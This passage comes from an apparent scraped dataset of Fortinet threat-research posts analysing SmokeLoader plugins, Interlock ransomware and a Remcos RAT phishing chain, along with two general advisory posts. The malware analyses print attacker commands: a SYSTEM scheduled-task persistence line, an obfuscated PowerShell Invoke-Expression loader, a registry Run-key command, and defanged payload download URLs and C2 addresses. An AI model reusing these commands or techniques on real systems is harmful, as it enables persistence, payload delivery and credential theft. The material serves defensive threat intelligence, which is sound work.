vaultcli.dll provides the functions to enumerate and get information from the credential vault. This plugin enumerates the registry keys underSoftware\\Mozillato find the one containing the valuePathToExeto get the default location of Firefox and Thunder. Then, the plugin searches forprofiles.iniin the default location and parses it to get the location oflogins.jsonandcookies.sqlite, from which it extracts login credentials. The plugin searches for theLocal Statefile withinWeb Data,Cookies,andLogin Datafolders under the installation path and then extracts login credentials and auto-fill data. To ensure it can locate the target file, it searches the following locations: It enumerates the registry keys under possible related registry keys to find the following values: It searches forsitemanager.xml,recentservers.xml, andfilezilla.xmlin the installation folder under%APPDATA%,%LOCALAPPDATA%orC:\\ProgramDatato collect the content in thehost,Port,User, andPasstags in these files. It enumerates the registry keys underSoftware\\Martin Prikrylto find theHostName,UserName,Password,RemoteDirectory, andPortNumbervalues. Email client Thunderbird .mab, .msf, inbox, sent, draft, template, archive .tbb, .tbn, .abn When a data file is found, the plugin parses its structure to obtain the email addresses of people who sent an email to the victim or who received a copy of the email. The email addresses are then sent to the C2 server, and the process is closed. iexplore.exe, microsoftedge.exe, microsoftedgecp.exe, firefox.exe, chrome.exe, opera.exe, msedge.exe, plugin-container.exe (sub-process of Firefox, the relevant cookies are for Macromedia flash player) It then constantly monitors currently running processes and injects the other part of the plugin into target browsers to hook specified APIs. Like other plugins, the injected code includes shellcode, a decryption algorithm, and encrypted data. The difference is that the code for the jump to the shell code is written to theatanfunction ofntdll,and the plugin callsCreateRemoteThreadto run theatanfunction in the target process. The plugin hooks different APIs depending on where it is injected: firefox.exe Kernel32.dll VirtualQuery nspr4.dll or nss3.dll PR_GetDescType iexplore.exe microsoftedgecp.exe wininet.dll msedge.dll, chrome.dll, opera.dll, opera_browser.dll Unknown function Before setting the hook, it suspends threads except for the current thread of the injected process. Next, it modifies code at the start of the target APIs to jump to the function to send data passed to the API to the C2 server. The plugin obtains the addresses of most target APIs by callingGetProcAddress. The only exception is the method to get the unknown function in DLL files related to the browsers based on Chromium. It parses the structure of the.rdatasection to find the function matching a specific byte pattern. When the hooks are set, the plugin resumes other threads of the current process and terminates the current thread. Plugin 6 uses the same method to inject hooking code snippets into target processes. The API functions to hook areWSASendand thesendfunction inws2_32.dll. When these functions are called, the plugin collects FTP, SMTP, IMTP, and POP3 hostnames. TranslateMessage Keyboard states and the window name where the user inputs the data GetClipboardData Get clipboard content SmokeLoader is a modular malware that is adaptable to different needs. In this case, SmokeLoader performs its attack with its plugins instead of downloading a completed file for the final stage. This shows the flexibility of SmokeLoader and emphasizes that analysts need to be careful even when looking at well-known malware like this. FortiGuard will continue monitoring these attack campaigns and provide appropriate protections as required. The malware described in this report is detected and blocked by FortiGuardAntivirusas: JS/Kryptik. CTS!tr.dldrVBS/TrojanDownloader. AAWM!tr.dldrW32/Smokeloader. F!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each of these solutions. As a result, customers who have these products with up-to-date protections are protected. The FortiGuardCDR(content disarm and reconstruction) service, which runs on both FortiGate and FortiMail, can disarm the malicious macros in the document. We also suggest that organizations go through Fortinet’s free NSE training module: NSE 1 – Information Security Awareness. This module is designed to help end users learn how to identify and protect themselves from phishing attacks. FortiGuard IP Reputation and Anti-Botnet Security Service proactively block these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. 198[.]23[.]188[.]14777[.]232[.]41[.]2991[.]183[.]104[.]24185[.]228[.]234[.]237 3e523ed80dbb592b1ff8c3345c3cd231ddd5a06e1af4c7b7d1f7f81249d0c4a3ad657479d9f6322daba65638523d65631ff83ba5a717261acb5a53fd48e522098dc06fdc2897d7c3438105ea0a39d2074774f80e051007fe7799b8195580ad2ffbe226dd0130c3c0c4db9d125cd25eca3c8e310dae8127d15c8be18041d41cd6392d201120936c1f0e77bdb4b490f2825c1e6f584f18055c742b36250f89566be29c269a4c3ee4bbd673bfe0d24ca7d131d9221607e26a60989e81d8ffc1709500874ab2a91433dfbfdc9ee6ade6173f3280737fc81505504ace11273f6406101a1c8cdac1c3cbae5f1140e850ee06b414259876dab97152669f7c0f93469b135dc92a6ed1ef2a5d9cf2a112532ad2c9fd70bff727e4cb60cd5d9c4966f2f77fa334ba0d8ac0676d09e41aa273589ee27338c44a09109a4d5defa45f1d9bd82b35e55053bed6b3c1027a3e7c140e67303e01e8fcbf42abac27b8e9df2a090ee3858d26e697bc60b642e5d92922b625f58532fc06f028962d8add5fa497981f337f9909677c290b98541be176251eca34b9f3d36555669a2639130adb97ca6958f4b16c3f8bff445fdcd9d7edb5883d20d7663c3744e137439fa961736d0a9471fb6ef14ac4cebf87f937f15553575f0f62ac62df917b490f602025a0985addd19dea895b5b1c03caa2b838b8def4e082392851325794c3bd2eb5ca7372d8e09ccfe7f6c1c0560bd56cd2df856d459b7fe7fd63b2f635c35151f61d4d04ce4162 a4ec792538455fb56f0b89ae10ddd0b2504afba092ba5cfa2083cf61b5fac0efcb92d320fc9bc674e8d37ceeebf0363f8e96dd67ef4ef543b3348f96ef567e5feb8381b156aad734ef3a0328b4985ed1edeca1c8d79d66e094598f8c6992ac71e3e7a3d0ba55b8dbbe3633b1dad0a3bbf4eada72dd8df3f7b1bc76a692862f23ea3b07a2356a7bfb92144f621ba551677a138c31d684072d69a4d37c1a378bb37ab20d40431b990a9a44e96dc53519f0af72eaf56c4b20f8995f95a48039bf67bdb897e6a8bfc21302ae1ac254b1b2e779684fe75b2b824cb24c80c775898940 f7544f07b4468e38e36607b5ac5b3835eac1487e7d16dd52ca882b3d021c19b6 FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/sophisticated-attack-targets-taiwan-with-smokeloader",
      "scraped_at": "2025-07-20T13:44:57.747559",
      "indicators": {
        "ip_address": [],
        "domain": [
          "icrosoftedgecp",
          "fexplorer",
          "r",
          "hrome",
          "ininet",
          "icrosoftedge",
          "ecentservers",
          "explore",
          "aultcli",
          "ss3",
          "ntoexplorer",
          "flogins",
          "md",
          "pera",
          "ndfilezilla",
          "lugin-container",
          "he",
          "ernel32",
          "sedge",
          "irefox",
          "spr4",
          "orsitemanager",
          "orprofiles",
          "xplorer",
          "ntoRegAsm"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [
          "f7544f07b4468e38e36607b5ac5b3835eac1487e7d16dd52ca882b3d021c19b6"
        ],
        "cve": [
          "CVE-2017-0199"
        ],
        "email": [],
        "url": []
      },
      "threat_score": 0.5145691258524488
    }
  },
  {
    "id": "Fortinet_64061",
    "source": "Fortinet",
    "title": "Ransomware Roundup - Interlock",
    "text": "FortiGuard Labs Threat Research FortiGuard Labs gathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants. This edition of the Ransomware Roundup covers the Interlock ransomware. Affected platforms:Microsoft Windows, FreeBSDImpacted parties:Microsoft Windows and FreeBSD usersImpact:Encrypts victims' files and demands ransom for file decryptionSeverity level:High Interlock is a new ransomware variant that was first submitted to a publicly available file-scanning site in early October 2024. This could indicate that the ransomware emerged as early as September or even earlier. The Interlock ransomware comes in Windows and FreeBSD versions. It encrypts files on victims' machines and demands a ransom to decrypt them via dropped ransom notes. While the initial infection vector of the Interlock ransomware has not been identified, researcher Sina Kheirkhah(@SinSinology)reportedthat a previously unknown backdoor was found on a victim’s machine. It is possible that the ransomware was deployed through this backdoor. The Windows version of the ransomware claims to support the following versions of Windows: The Interlock ransomware takes the following parameters on execution: Once executed, the Interlock ransomware encrypts files on victims’ machines and drops a ransom note labeled “!__README__!.txt”. Files encrypted by the Interlock ransomware will have a “.interlock” file extension. The ransomware is designed to exclude the following files and filetypes from file encryption: It also excludes the following folders from file encryption: $Recycle. Bin Documents and Settings ProgramData System Volume Information It also creates a scheduled task named \"TaskSystem\": schtasks /create /sc DAILY /tn \"TaskSystem\" /tr \"cmd /C cd %s && %s\" /st 20:00 /ru system > nul The above script creates a new scheduled task, TaskSystem, that runs every day at 20:00 using the System account. The FreeBSD version of the ransomware takes parameters on execution: Once the ransomware is executed, it encrypts files on victims' machines using the AES-CBC encryption algorithm and adds an \".interlock\" extension to the encrypted files. The ransomware then leaves a text file containing the same ransom note as the Windows version. The FreeBSD version of the Interlock ransomware skips files with an “.interlock” extension from file encryption. It also excludes the following directories from file encryption: /lost+found It also avoids encrypting the following file: At the time of our investigation, the Interlock ransomware data leak site listed six victims. Five of those were in the United States, and the other was in Italy. However, submission data to the publicly available scanning service potentially shows even broader victim locations. Interlock ransomware samples have been submitted from India, Italy, Japan, Germany, Peru, South Korea, Turkey, and the United States. The victims are in the education, finance, government, healthcare, and manufacturing sectors, indicating that the Interlock ransomware does not have a policy to avoid targeting essential businesses and organizations, as some other ransomware groups have. Each victim has its own page describing the victim’s organization and lists stolen and leaked files. The Interlock ransomware runs its data leak site on TOR, which is divided into the following four sections: The Interlock ransomware described in this report is detected and blocked by FortiGuard Antivirus as: FortiGate, FortiMail, FortiClient, and FortiEDR support theFortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each solution, so customers with these products have up-to-date protection. Interlock Ransomware File IOCs a26f0a2da63a838161a7d335aaa5e4b314a232acc15dcabdb6f6dbec63cda642 Interlock ransomware (Windows version) 28c3c50d115d2b8ffc7ba0a8de9572fbe307907aaae3a486aabd8c0266e9426f Interlock ransomware (FreeBSD version) e86bb8361c436be94b0901e5b39db9b6666134f23cce1e5581421c2981405cb1 f00a7652ad70ddb6871eeef5ece097e2cf68f3d9a6b7acfbffd33f82558ab50e IOCs of the backdoor malware reported by Sina Kheirkhah (@SinSinology) e9ff4d40aeec2ff9d2886c7e7aea7634d8997a14ca3740645fd3101808cc187b Backdoor malware allegedly found on the Interock ransomware victim’s machine 7d750012afc9f680615fe3a23505f13ab738beef50cd92ebc864755af0775193 6933141fbdcdcaa9e92d6586dd549ac1cb21583ba9a27aa23cf133ecfdf36ddf It is vital to keep all AV and IPS signatures up to date due to the ease of disruption, damage to daily operations, potential impact on an organization’s reputation, and unwanted destruction or release of personally identifiable information (PII). Since the majority of ransomware is delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance against phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREEFortinet Certified Fundamentals (FCF)in Cybersecurity training. The training is designed to help end users learn about today's threat landscape and will introduce basic cybersecurity concepts and technology. Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack. As part of the industry's leading fully integratedSecurity Fabric, Fortinet delivers native synergy and automation across your security ecosystem. It also provides an extensive portfolio of technology- and human-based as-a-service offerings powered by our global FortiGuard team of seasoned cybersecurity experts. FortiReconis a SaaS-based Digital Risk Prevention Service backed by cybersecurity experts. It provides unrivaled threat intelligence on the latest threat actor activity across the dark web, enabling a rich understanding of threat actors’ motivations and TTPs. The service can detect evidence of attacks in progress, allowing customers to respond rapidly to and shut down active threats. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because the payment does not guarantee that files will be recovered. According to aUS Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3). FortiGuard Labs’Emergency Incident Response Serviceprovides rapid and effective response when an incident is detected. OurIncident Readiness Subscription Serviceprovides tools and guidance to help you better prepare for a cyber incident through readiness assessments, IR playbook development, and IR playbook testing (tabletop exercises). Additionally,FortiRecon Digital Risk Protection (DRP)is a SaaS-based service that provides a view of what adversaries are seeing, doing, and planning to help you counter attacks at the reconnaissance phase and significantly reduce the risk, time, and cost of later-stage threat mitigation. Ransomware Roundup FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/ransomware-roundup-interlock",
      "scraped_at": "2025-07-20T13:45:06.160607",
      "indicators": {
        "ip_address": [],
        "domain": [],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [
          "7d750012afc9f680615fe3a23505f13ab738beef50cd92ebc864755af0775193",
          "f00a7652ad70ddb6871eeef5ece097e2cf68f3d9a6b7acfbffd33f82558ab50e",
          "e9ff4d40aeec2ff9d2886c7e7aea7634d8997a14ca3740645fd3101808cc187b",
          "a26f0a2da63a838161a7d335aaa5e4b314a232acc15dcabdb6f6dbec63cda642",
          "28c3c50d115d2b8ffc7ba0a8de9572fbe307907aaae3a486aabd8c0266e9426f",
          "e86bb8361c436be94b0901e5b39db9b6666134f23cce1e5581421c2981405cb1",
          "6933141fbdcdcaa9e92d6586dd549ac1cb21583ba9a27aa23cf133ecfdf36ddf"
        ],
        "cve": [],
        "email": [],
        "url": []
      },
      "threat_score": 0.6371681415929203
    }
  },
  {
    "id": "Fortinet_82754",
    "source": "Fortinet",
    "title": "Advanced Cyberthreats Targeting Holiday Shoppers",
    "text": "FortiGuard Labs Threat Research As the holiday season approaches, shoppers worldwide eagerly anticipate snagging deals during Black Friday, Cyber Monday, and other holiday sales. However, this heightened online activity also draws the attention of cybercriminals. A recent report from FortiGuard Labs,Understanding Threat Actor Readiness for the Upcoming Holiday Season, reveals the advanced tactics attackers have been developing to exploit this year’s shopping frenzy. This blog highlights the report’s key findings from the darknet and offers some practical advice to help shoppers and businesses stay secure this season. The holiday season presents an irresistible opportunity for cybercriminals to capitalize on increased online transactions. Tools and services now available on the darknet empower attackers to target e-commerce platforms and unsuspecting shoppers more effectively than ever. This year, threat actors are leveraging cutting-edge techniques, including AI-powered phishing lures, sophisticated website cloning tools, and remote code execution (RCE) exploits to gain unauthorized access to shopping platforms. AI-driven methods allow attackers to craft convincing emails and replicas of legitimate websites to steal data or trick users into disclosing sensitive information. The report also highlights the growing use of deceptive holiday-themed domains that mimic trusted retailers to lure shoppers with enticing but fraudulent offers. Sniffing tools are another critical weapon that enables cybercriminals to intercept sensitive data like credit card details during online transactions. Key highlights from the report include: To mitigate these risks, shoppers and businesses must adopt proactive measures. Vigilance is essential for shoppers. Double-check URLs before entering sensitive information and use secure payment methods such as credit cards with fraud protection. Avoid shopping over public Wi-Fi networks, which can leave you vulnerable to session hijacking. And enabling multi-factor authentication on your accounts can provide an additional layer of security. It is also crucial to monitor your financial statements regularly for unauthorized transactions. Businesses must prioritize their cybersecurity posture. Keeping e-commerce platforms and plugins up to date and conducting regular vulnerability scans can significantly reduce risk. Implementing advanced fraud detection tools helps identify unusual activities, such as brute-force login attempts or fake traffic. Educating customers on recognizing phishing attempts and promoting safe shopping habits is equally important. Monitoring domain registrations for potential impersonations and reporting them promptly can help protect your brand. Finally, securing admin panels with strong passwords and restricted access can prevent unauthorized breaches. The holiday season should be a time of joy and celebration, not risk and vulnerability. However, for this to happen, businesses must take a proactive stance on cybersecurity while consumers must stay informed and cautious about the threats lurking online. Download the FortiGuard Labs report,Understanding Threat Actor Readiness for the Upcoming Holiday Season, to better understand this year’s evolving threat landscape and gain actionable insights for protecting yourself, your business, and your customers. holiday shopping FortiGuard Labs Threat Research FortiGuard Labs Threat Research Industry Trends Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/advanced-cyberthreats-targeting-holiday-shoppers",
      "scraped_at": "2025-07-20T13:45:14.457747",
      "indicators": {
        "ip_address": [],
        "domain": [],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [],
        "cve": [],
        "email": [],
        "url": []
      },
      "threat_score": 0.2526315789473685
    }
  },
  {
    "id": "Fortinet_79079",
    "source": "Fortinet",
    "title": "Threat Predictions for 2025: Get Ready for Bigger, Bolder Attacks",
    "text": "FortiGuard Labs Threat Research While threat actors continue to rely on many “classic” tactics that have existed for decades, our threat predictions for the coming year largely focus on cybercriminals embracing bigger, bolder, and, from their perspectives, better attacks. From Cybercrime-as-a-Service (CaaS) groups becoming more specialized to adversaries using sophisticated playbooks that combine both digital and physical threats, cybercriminals are upping the ante to execute more targeted and harmful attacks. In our2025 threat predictions report, our FortiGuard Labs team looks at tried-and-true attacks cybercriminals continue to rely on and how these have evolved, shares fresh threat trends to watch for this year and beyond, and offers advice on how organizations worldwide can enhance their resilience in the face of a changing threat landscape. As cybercrime evolves, we anticipate seeing several unique trends emerge in 2025 and beyond. Here’s a glimpse of what we expect. Cybercriminals will always find new ways to infiltrate organizations. Yet there are numerous opportunities for the cybersecurity community to collaborate to better anticipate adversaries’ next moves and interrupt their activities in a meaningful way. The value of industrywide efforts and public-private partnerships cannot be overstated, and we anticipate that the number of organizations participating in these collaborations will grow in the coming years. Additionally, organizations must remember that cybersecurity is everyone’s job, not just the responsibility of the security and IT teams. For example, implementing enterprisewide security awareness and training is a vital component of managing risk. And finally, other entities have a responsibility to promote and adhere to robust cybersecurity practices, ranging from governments to the vendors that manufacture the security products we rely on. No single organization or security team can disrupt cybercrime alone. By working together and sharing intelligence across the industry, we’re collectively better positioned to fight against adversaries and effectively protect society. Download a copy of ourfull predictions report for 2025. Learn more about Fortinet’sFortiGuard Labsthreat research and intelligence organization and the FortiGuard Security Subscriptions and Servicesportfolio. Sign up for FortiGuard Outbreak Alertsto stay up to speed on the latest breaking threats. Learn more about Fortinet’sfree cybersecurity training, an initiative of Fortinet’s Training Advancement Agenda, or about the FortinetNetwork Security Expert program,Academic Partner program, andVeterans program. derek manky Business and Technology Industry Trends Industry Trends Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/threat-predictions-for-2025-get-ready-for-bigger-bolder-attacks",
      "scraped_at": "2025-07-20T13:45:22.818147",
      "indicators": {
        "ip_address": [],
        "domain": [],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [],
        "cve": [],
        "email": [],
        "url": []
      },
      "threat_score": 0.10471204188481677
    }
  },
  {
    "id": "Fortinet_44701",
    "source": "Fortinet",
    "title": "New Campaign Uses Remcos RAT to Exploit Victims",
    "text": "FortiGuard Labs Threat Research Affected platforms:Microsoft WindowsImpacted parties:Windows UsersImpact:Fully remotely control a victim’s computerSeverity level:High Fortinet’s FortiGuard Labs recently noticed a phishing campaign in the wild. It is initialized with a phishing email containing a malicious Excel document. Upon researching the campaign, I found it was spreading a new variant of the Remcos RAT. Remcos is a commercial RAT (remote administration tool) sold online. It provides purchases with a wide range of advanced features to remotely control computers belonging to the buyer. However, threat actors have abused Remcos to collect sensitive information from victims and remotely control their computers to perform further malicious acts. Figure 1 displays the Remcos webpage. In this security blog, I will show how Remcos is delivered to a victim’s device, what kinds of anti-analysis techniques it leverages to protect itself from being analyzed, how this variant of Remcos is deployed, how it achieves persistence on the victim’s device, and what advanced features Remcos provides to remotely control a victim’s device. The phishing email is shown in Figure 2. It contains an attached malicious Excel file disguised as an order file to convince the recipient to open the document. CVE-2017-0199is a Remote Code Execution vulnerability that exploits how Microsoft Office and WordPad parse specially crafted files. Once the recipient opens the attached file, the MS Excel program shows the file content, as seen in Figure 3. In the background, the CVE-2017-0199 vulnerability is exploited to download an HTA file and execute it on the recipient’s device. As you may know, a crafted embedded OLE object leads to this vulnerability. Figure 4 demonstrates the content of the crafted embedded OLE object (“\\x01Ole”). MS Excel program accesses the short URL “hxxps://og1[.]in/2Rxzb3.” It is then redirected to another URL, “hxxp://192[.]3[.]220[.]22/xampp/en/cookienetbookinetcahce.hta”. The download packet, shown in Figure 5, is a Wireshark screenshot. The HTA file is an HTML Application file. It is executed by a Windows-native application (mshta.exe) called by MS Excel using DCOM components. Its code is wrapped in multiple layers using different script languages and encoding methods, including JavaScript, VBScript, Base64-encoded, URL-encoded, and PowerShell, to protect itself from detection and analysis. Figure 6 shows some script code examples. These are executed when the downloaded HTA file is parsed in mshta.exe. Take a look at the Powershell code at the bottom of Figure 6. It calls the API URLDownloadToFile() to download an EXE file from the URL “hxxp://192[.]3[.]220[.]22/430/dllhost.exe” into a local file, “%AppData%\\dllhost.exe.” Executing “STaRt $EnV: APPDATA\\dllhost.exe” starts the downloaded EXE file on the victim’s device. Once the downloaded EXE file, dllhost.exe, starts, it extracts a batch of files into the %AppData% folder. Figure 7 is a screenshot of the extracted files and sub-folders located in %AppData%\\intercessionate\\Favourablies117\\sulfonylurea. Some of the key data are hidden in these files. dllhost.exe then runs the PowerShell program by calling the API CreateProcessW() to execute a piece of PowerShell code, as illustrated in Figure 8. Since dllhost.exe is a 32-bit process, it runs a 32-bit PowerShell, “C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe.” This is important because the malicious code only works on the 32-bit PowerShell process. The PowerShell code breaks down as follows. $krjning=Get-Content -Raw '%AppData% \\intercessionate\\Favourablies117\\sulfonylurea\\Aerognosy. Res';$Lukewarmly95=$krjning. SubString(5322,3);.$Lukewarmly95($krjning) It reads the content of “Aerognosy. Res,” an extracted file, into a local variable “$krjning,” which is full of PowerShell script. “iEx” is the return value of SubString(5322,3), which is short for an Invoke-Expression used to run a string as a command or expression. Finally, “iEx” executes the entire PowerShell script (“Aerognosy. Res”) after calling “.$Lukewarmly95($krjning).” Again, the PowerShell code is thoroughly obfuscated and encoded. Based on my research on the code, I discovered it performs the following functions: As I mentioned, the copied malicious code relies on a 32-bit version of PowerShell. It first runs a piece of self-decryption code mixed with a huge amount of useless instructions, creating a big challenge for analysts. Figure 10 presents the end of the decrypting code, where it is about to execute the “call edi” instruction. The EDI register now points to the decrypted code, as shown on the right. It leverages numerous complicated anti-analysis techniques to protect itself from being analyzed. 1. It installs a vectored exception handler. Whenever an exception occurs, the exception handler is called to handle it. The exception code provides corresponding ways to restore the code to resume from another offset. There are numerous exception instructions inside the malicious code. In other words, this strategy drives the entire code. Figure 11 shows an instruction that can raise an exception (0x8000003) at 0xEE16222, which the exception handler will then capture and handle. The exception handler function also checks the DR registers (Debug Registers), which are Dr0, Dr1, Dr2, Dr3, Dr4, Dr5, Dr6, and Dr7. Their values are not 0 when a debugger is present. 2. System APIs are dynamically gained and called in a unique way. There are no API name constant strings in the code. Instead, it keeps the hash codes of the API names. Whenever it calls an API, it uses a unique function that retrieves the API information from the PEB, which is pointed to by fs:[30h] to get their function address by matching the name’s hash code. This raises the difficulty of performing static analysis. In addition, it has another function that is called every time an API is called. This function detects if the debugger has set the API breakpoint. It also encrypts the code from the caller’s return address to the base address, which cleans up the code just executed. 3. It is called ZwSetInformationThread(), and it performs anti-debugging. The malicious code calls API ZwSetInformationThread() with the argument ThreadHideFromDebugger (0x11) and the current thread (0xFFFFFFFE). This mechanism in Windows can conceal a thread’s existence from debuggers. Figure 12 illustrates how it calls this API with the associated arguments. If a debugger is attached to the current process, it exits immediately once the API is called. 4. It checks the result value of API ZwQueryInformationProcess(). It calls API ZwQueryInformationProcess() with the ProcessDebugPort (7) argument to detect if the debugPort is set (non-zero value). If yes, this means a debugger is attached to the current process (PowerShell.exe). 5. All the constant values are gained at run time. Please refer to the code snippet below to see how it splits “mov ebx 100h” into three instructions. 6. It uses an API hooking technique for several APIs. The malicious code simulates executing multiple API instructions (say, two instructions) at the beginning and then jumps to the API to execute the rest of the instructions (beginning with the 3rd instruction). Below is an example for CreateProcessInternalW(). The highlighted codes are simulated, which can invalidate any API breakpoints. Whenever any of the above detection conditions are triggered, the current process (PowerShell.exe) can become unresponsive, crash, or exit unexpectedly. The malicious code performs process hollowing to put itself into a newly created Vaccinerende.exe process (copied from dllhost.exe). To do this, it calls the API CreateProcessInternalW() with CreatFlags of CREATE_SUSPENDED (0x4), which will suspend the new process after it is created. It then calls some related APIs to transfer all the malicious code to the new process and run it. The relevant APIs are NtAllocateVirtualMemory(), ZwCreateSection(), NtMapViewOfSection(), NtGetContextThread(), NtSetContextThread(), and NtResumeThread(). It performs all the anti-analysis detections described in the above section and then uses a workflow different from the PowerShell process. According to my research, it finishes some tasks, like maintaining persistence, downloading and decrypting the Remcos payload execution, and starting the downloaded Remcos in memory. The malicious code adds a new auto-run item to the system registry to maintain persistence and maintain control of the victim’s device when it is restarted. Figure 14 shows the malicious code as it is about to run the REG (reg.exe) process to add the auto-run item and how it appears in the Registry Editor. It calls the API ShellExecuteW() to run cmd.exe with a command line string of /c REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /f /v \"Chivey57\" /t REG_EXPAND_SZ /d \"%Misbehavers% -windowstyle 1 $Frligheden=(gp -Path 'HKCU:\\Software\\Roscoelite\\'). Aftvttedes;%Misbehavers% ($Frligheden).\" “%Misbehavers%” has been defined as the full path to the 32-bit PowerShell.exe in the system environment. It reads a piece of PowerShell code, which is the same as the PowerShell code that dllhost.exe executes, from a string value called “Aftvttedes” in the system registry. Next, the malicious code downloads an encrypted file from the URL “hxxp[:]//192[.]3[.]220[.]22/hFXELFSwRHRwqbE214.bin.” The file contains the encrypted Remcos malware. To download the file, some relevant APIs, like InternetOpenA(), InternetOpenUrlA(), and InternetReadFile(), are called in a row. After decrypting the downloaded file, I found a new variant of Remcos. Rather than saving the Remcos file into a local file and running it, it directly deploys Remcos in the current process's memory (Vaccinerende.exe). In other words, it is a fileless variant of Remcos. It then starts Remcos on a thread, where the thread function (StartAddress) is the entry point. To start the thread, it calls an undocumented API, NtCreateThreadEx(). Figure 15 shows a screenshot of the debugger as it is about to call the API to start Remcos. Each Remcos variant has a setting block with a batch of configurations that control how Remcos operates on the victim’s device. The setting block is encrypted and saved in the Resource section named “SETTINGS,” which gets decrypted at the start and initializes Remcos with the setting block. Look at Figure 16 to examine the decrypted setting block in memory. The setting block has 57 values in total, which are separated by “\\x7C\\x1E\\x1E\\x1F\\x7C”, as illustrated in Figure 16. The values in the setting block are retrieved by their index, from 0 to 56, through a special function. The setting values tell Remcos how to do its work on the victim’s device, including the C&C server IP address and port, Remcos’ name, Remcos’ mutex name (also registry key name), a Remcos license number, the keylogger’s local log file, a couple of certificates used to verify and communicate with the C&C server, and several switch flags indicating if a feature is enabled or disabled, such as Keylogger, Screenshot, Watchdog, Record audios, Reset browsers’ login, and more. The C&C server IP&Port string at index 0 is “107[.]173[.]4[.]16:2404:1,” where “107[.]173[.]4[.]16” is the IP address, “2404” is the TCP port, and the last “1” means that it enables TLS to communicate with the C&C server. Remcos collects some basic information from the victim’s device. It then encrypts and sends the collected data to its C&C server to register that the victim’s device is online and ready to be controlled. This is the first command packet sent to the C&C server. The memory dump data in Figure 17 shows the content of the register packet (command ID 4Bh) that is about to be encrypted. When TLS is enabled (as set in the settings block), packets follow the same structure, whether sending or receiving. These packets consist ofPacket Magic(like 0xFF0424) +Command Data Size(like 0x2C6) +Command ID(like 0x4B) +Command Data+Packet Type(like 0x17, 0x16, and 0x15). I will break down the command data of the 4B to explain what basic information Remcos collects from the victim’s device. The command data has many separators (“\\x7C\\x1E\\x1E\\x1F\\x7C”) to separate the collected basic information. After registering the victim’s device on the C&C server, it receives a control command packet from the server to perform further work on the victim’s device. These features and corresponding commands are detailed below. This example of control command 06h asks Remcos to obtain all running process lists from the victim’s device. Remcos sends a 4Fh command packet with the collected process list consisting of the process name, PID, architecture (64bit or 32bit), and the full path, as shown in Figure 18. Figure 19 is a screenshot of the C&C server view of the process list. Remcos includes a function that parses the received control command data from the server and then performs the corresponding action on the victim’s device. My analysis of this function shows that Remcos has the features and commands listed in the following chart. In this analysis, I walked through the entire process of the phishing campaign. It begins with a phishing email with an attached OLE Excel document. This disguised email is used to trick the recipient into opening the attached Excel document. The CVE-2017-0199 vulnerability is exploited once the Excel file is opened on the victim’s device. It then downloads an HTA file and executes it on the device. Multiple script languages are leveraged to download an EXE file (dllhost.exe), which then starts the 32-bit PowerShell process to load the malicious code from extracted files and execute it in the PowerShell process. Next, I explained what anti-analysis techniques are used in the code, such as a vectored exception handler, dynamically gained APIs, dynamically calculated constant numbers, the APIs ZwSetInformationThread() and ZwQueryInformationProcess(), and API hooking. After passing the detections introduced in the anti-analysis part, it performs process hollowing to run the malicious code in the new process “Vaccinerende.exe,” which not only ensures persistence on the victim’s device but also downloads and decrypts the Remcos payload file. I then elaborated on how it keeps Remcos in memory and starts its entry point function in a thread (API NtCreateThreadEx()). Subsequently, I explained how Remcos works with its setting block on the victim’s device, how Remcos communicates with its C&C server, and what the format of the traffic packet looks like. Finally, I focused on introducing the features this Remcos variant can perform on the victim’s device and listing the relevant control commands for each feature. Figure 20 shows the entire process of the phishing campaign. Fortinet customers are already protected from this campaign with FortiGuard’s AntiSPAM, Web Filtering, IPS, and AntiVirus services as follows: The relevant URLs are rated as “Malicious Websites” by theFortiGuard Web Filtering service. FortiMailrecognizes the phishing email as “virus detected.” In addition, real-time anti-phishing provided by FortiSandbox embedded in Fortinet’s FortiMail, web filtering, and antivirus solutions offers advanced protection against both known and unknown phishing attempts. FortiGuard IPS servicedetects the vulnerability exploit against CVE-2017-0199 with the signature “MS. Office. OLE.autolink. 